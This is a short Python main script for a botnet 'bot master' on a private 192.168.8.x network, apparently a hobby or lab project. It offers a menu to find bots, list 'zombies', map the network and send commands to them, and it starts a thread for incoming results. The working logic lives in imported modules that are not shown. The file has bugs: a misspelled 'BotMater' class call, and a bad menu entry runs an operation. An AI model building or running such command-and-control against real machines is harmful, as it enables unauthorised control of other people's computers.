import threading
from BotMaster import *
from Utils import *

# setup this values for the bot master #

__MY_NETWORK = '192.168.8.1'
__GATEWAY_IP = '192.168.8.254'
__SUBNET_MASK = '255.255.255.0'


# ==================================== #


def main():

    # create bot master object
    master = BotMater(__MY_NETWORK, __GATEWAY_IP, __SUBNET_MASK)

    # list users operations
    options = [master.search_for_bots,
               master.show_zombies,
               master.get_zombie_tree,
               master.show_entire_network,
               master.send_command,
               master.show_ip_macs
               ]

    # start handle_incomings thread (COVID-20 results)
    threading.Thread(target=master.handle_incomings).start()

    while True:

        # show options to the user
        show_options()

        # wait for the user to choose an option
        opt = safe_cast(input(), int, default=-1)
        try:
            options[opt - 1]()  # execute operation
        except IndexError:
            print("[+] Enter one of the following options")
        opt = 0
        input('press any key to continue...')

    # ACTIONS:
    # scan the net
    # ask for net_tree
    # ask for direct peer
    # send commands


if __name__ == '__main__':
    main()
